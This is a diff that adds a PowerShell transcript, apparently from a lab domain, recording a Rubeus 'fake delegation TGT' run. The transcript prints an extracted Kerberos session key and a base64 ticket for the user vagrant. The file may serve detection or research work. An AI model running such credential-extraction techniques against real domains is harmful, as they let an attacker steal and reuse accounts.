@@ -1,0 +1,46 @@
+﻿**********************
+Windows PowerShell transcript start
+Start time: 20250222205431
+Username: SCCMLAB\vagrant
+RunAs User: SCCMLAB\vagrant
+Configuration Name: 
+Machine: DC (Microsoft Windows NT 10.0.17763.0)
+Host Application: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+Process ID: 5956
+PSVersion: 5.1.17763.6893
+PSEdition: Desktop
+PSCompatibleVersions: 1.0, 2.0, 3.0, 4.0, 5.0, 5.1.17763.6893
+BuildVersion: 10.0.17763.6893
+CLRVersion: 4.0.30319.42000
+WSManStackVersion: 3.0
+PSRemotingProtocolVersion: 2.3
+SerializationVersion: 1.1.0.1
+**********************
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.3.1
+
+
+[*] Action: Request Fake Delegation TGT (current user)
+
+[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
+[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC.sccm.lab'
+[+] Kerberos GSS-API initialization success!
+[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
+[*] Found the AP-REQ delegation ticket in the GSS-API output.
+[*] Authenticator etype: aes256_cts_hmac_sha1
+[*] Extracted the service ticket session key from the ticket cache: P6OaAt0M/nyViyWHiudvD+JK1NRISH1GaAfXtLDS5kI=
+[+] Successfully decrypted the authenticator
+[*] base64(ticket.kirbi):
+
+      doIFaDCCBWSgAwIBBaEDAgEWooIEejCCBHZhggRyMIIEbqADAgEFoQobCFNDQ00uTEFCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhTQ0NNLkxBQqOCBDowggQ2oAMCARKhAwIBAqKCBCgEggQkcGEqgEPGVZ70NhK62e0Rb+6cquJBv5pO+dNQsgBTdEeP1DhU/VgO7ncSETFjAHismcbMH1wmqYzmhnfDntX+gugCywmhI85pmd2yYAHTW5vjkP0sBrXeRFsrOxmu0S5r2AN13tzqenBzUWXRDT9ljmNB8KlY9GfPN0KCidHgTQPwq8WZkgs8eehDw36XIiNxqm7LXwrdBpca8TQYDN/IDg4vU5o1uSj4RZRJMfDGymg60/YuJ2GBBuy9h8FfCJZR3R04n41u7VR8FDmBYFkv3x74beYsQYUX1D6zYc9LYd7fWVhlyuwnX4nj9HK6Mc5oAWwvyjeig0TiHkxqR6rSwozydiIacoDIvYwmngOu9SxAPr4nF9NxWLIPzhJoqYI9olmsxMngr35zfE3MMIXIFz5c9zSZKeZjxx3bfHMU2TuQYmsJAd1/q89zA4gJsZvLqPQgcygAtj6Uv90/h0o9TuUkWGrvsafz0D5wG007IJr4hN5V8/pEUnSG0CH4FBvaSXzcs/N03FyQOXRBZy/zWRvJ3qd0rsuS+xuV82qyk2U2iTrgrlvs5CKO8tYM2jmpLZDU8cBHf0uBTZMaoo9vrvUaqVXvNJQAQSmZukS4M8YzM1He8of6TWn7m5EnUSDMm1yfFd3LfPz0iRwSCi2tAGuelUpPyC2KCkpySegQrnp6PXITmVt9rZp3DOm/MszpLGAMcAOxKqVf1QQGjYxBnAmAYQMmY3eh9br/GrfGf/DYfH02dkTgjkmh9EGWkCCspsTrmEOd1z0p3RjWD4M6mK/1/fABUiYE9UIyKyN5SEG7YRIBWu0vECkV1IIo9dyoq9WhM4wzMrz562u4TP44ASKvminjQGEJ4jVuVe0OSvYnutmmH8JrwnNS8K233Pbh+HUWhnLDE8zBc7i/L2RSw/IF57YnTfAb1QBb5BYoE7d2J0Q/zubQwl6k6yZWLnQCjr51aMeip0xm+vo9ZcIs1WRLOlF6IqwgwxUwEIGEV++e8xJVYHSBV+yeav7rRTMGKNaDWbgJdCxJ7RHfjPQwSeoUn2IM4bCks6CRC2QF8R2/Alk/HxE9hIxij1LeZM/3KpSQzzX9uo201kXdL+36x2nqcsoJf2IOdXGtvW4silC+DrnWreosGGjauBbG7uYq0Vdl1SqwZE6An8cF86FBMvW5/XeWJQdoi49tBFlOmtUPY3DEKKBrVmQHOJXmI7DqHDF5hU2Vk2TWwoAOo3dXR6sueWLKdUTMj8gBOtQVdewjFsBfhegmRl9Z/vsZpD6wlF/KML8dHk+NVTXEP8w8EYVadCCU6kQCtZGF7EF9/tOKi0mLY5giB6wVHVEYiMWsI8ByK2dqaiMJHsMtSfPsvk+77xu1nnoOfC2USFSt0EsP97fXDsdGWLQRgZi2QwQ9bcjB8KOB2TCB1qADAgEAooHOBIHLfYHIMIHFoIHCMIG/MIG8oCswKaADAgESoSIEIKipvZFd8OACaObolYoYgZNSSrN+RKuu1Z4hbDs3t+suoQobCFNDQ00uTEFCohQwEqADAgEBoQswCRsHdmFncmFudKMHAwUAYKEAAKURGA8yMDI1MDIyMzA0NTQzMFqmERgPMjAyNTAyMjMxNDI5MDFapxEYDzIwMjUwMzAyMDQyOTAxWqgKGwhTQ0NNLkxBQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIU0NDTS5MQUI=
+**********************
+Windows PowerShell transcript end
+End time: 20250222205431
+**********************
